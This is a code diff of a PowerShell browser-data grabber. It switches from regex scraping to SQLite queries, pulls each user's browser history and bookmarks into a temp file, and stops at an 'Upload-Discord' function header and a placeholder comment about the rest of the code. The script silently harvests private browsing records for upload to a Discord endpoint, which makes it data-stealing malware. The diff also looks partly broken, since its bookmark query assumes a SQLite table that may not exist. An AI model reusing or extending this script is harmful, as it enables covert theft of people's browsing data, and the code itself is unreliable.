@@ -1,3 +1,11 @@
+# Install the SQLite PowerShell module if not already installed
+if (-not(Get-Module -ListAvailable -Name PSSQLite)) {
+    Install-PackageProvider -Name NuGet -Force
+    Install-Module -Name PSSQLite -Force
+}
+
+Import-Module PSSQLite
+
 function Get-BrowserData {
 
     [CmdletBinding()]
@@ -8,8 +16,10 @@ function Get-BrowserData {
         [string]$DataType
     )
 
-    $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
-    $Search = $Regex
+    $query = @{
+        'history' = "SELECT url FROM urls"
+        'bookmarks' = "SELECT url FROM bookmarks"
+    }
 
     switch ($Browser.ToLower()) {
         'chrome' {
@@ -37,15 +47,14 @@ function Get-BrowserData {
     }
 
     if (Test-Path $Path) {
-        $Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
-        $Value | ForEach-Object {
-            $Key = $_
-            if ($Key -match $Search) {
+        $browserData = Invoke-SqliteQuery -DataSource $Path -Query $query[$DataType] -ErrorAction SilentlyContinue
+        if ($null -ne $browserData) {
+            $browserData | ForEach-Object {
                 New-Object -TypeName PSObject -Property @{
                     User = $env:UserName
                     Browser = $Browser
                     DataType = $DataType
-                    Data = $_
+                    Data = $_.url
                 }
             }
         }
@@ -60,6 +69,9 @@ foreach ($browser in $browsers) {
         Get-BrowserData -Browser $browser -DataType $dataType >> $env:TMP\--BrowserData.txt
     }
 }
+
+# ... Rest of the code (Upload-Discord function and execution)
+
 
 function Upload-Discord {
 
